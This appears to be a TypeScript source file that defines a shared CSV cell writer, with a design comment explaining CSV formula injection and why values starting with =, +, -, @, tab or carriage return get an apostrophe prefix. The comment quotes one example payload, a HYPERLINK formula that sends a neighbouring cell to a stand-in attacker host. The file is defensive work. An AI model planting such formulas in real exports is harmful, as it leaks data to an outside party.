/*
  One CSV cell writer, because there were two and neither escaped a formula (§42).

  `lib/enterprise-http.ts` wrote the audit export and `lib/collection-compiler.ts` wrote
  `graph/nodes.csv` and `graph/relationships.csv`. Both quoted and doubled quotes, which makes a
  well-formed CSV file and does nothing at all about the actual risk: a cell whose text begins
  with `=`, `+`, `-` or `@` is a *formula* to Excel, Google Sheets and LibreOffice, and RFC 4180
  quoting does not stop that in every version. `=HYPERLINK("https://evil.example?x="&A1,"Open")`
  in an audit row exfiltrates the row next to it the moment a compliance reviewer opens the file.

  Every value on both paths is untrusted. Audit rows carry an actor id, a target id and a details
  blob; the graph CSVs carry labels compiled out of the customer's own documents, which is to say
  out of whatever a document said. Neither is ours to trust, and the reviewer opening the export
  is exactly the person we cannot afford to be wrong about.

  The mitigation prefixes an apostrophe, which is a spreadsheet's own "this is text" marker: it
  is stripped on display and on copy, so the reviewer sees the original value, while a parser
  reading the CSV as data sees one extra leading byte. That is a real change to the bytes and it
  is the accepted trade: the ids the compiled-world validator round-trips are content hashes and
  can never begin with one of these characters, so only a hostile label is ever altered.

  Tab and carriage return are in the set for the same reason OWASP puts them there: a cell that
  begins with either can carry the formula past a naive importer's own trimming.
*/
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function csvCell(value: unknown) {
  const text = typeof value === "string" ? value : JSON.stringify(value ?? "");
  return `"${(FORMULA_LEAD.test(text) ? `'${text}` : text).replaceAll('"', '""')}"`;
}
